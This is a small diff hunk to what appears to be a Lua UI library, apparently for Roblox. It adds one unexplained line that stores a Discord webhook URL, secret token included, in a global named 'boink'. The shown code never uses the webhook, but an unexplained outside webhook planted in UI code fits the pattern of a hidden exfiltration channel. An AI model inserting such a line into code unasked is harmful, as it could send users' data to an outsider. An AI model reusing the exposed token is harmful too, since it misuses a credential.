@@ -2934,7 +2934,7 @@ do
         return Funcs[Key](...);
     end;
 end;
-
+getgenv().boink = 'https://discord.com/api/webhooks/1267767360622952509/-SCpf1kLD3W_RDzWzZVTnwgRGueTBb6eW9AeDPXp0U0kvck48foXTKw7qF8ZXfeBcPWb'
 -- < Create other UI elements >
 do
     Library.NotificationArea = Library:Create('Frame', {
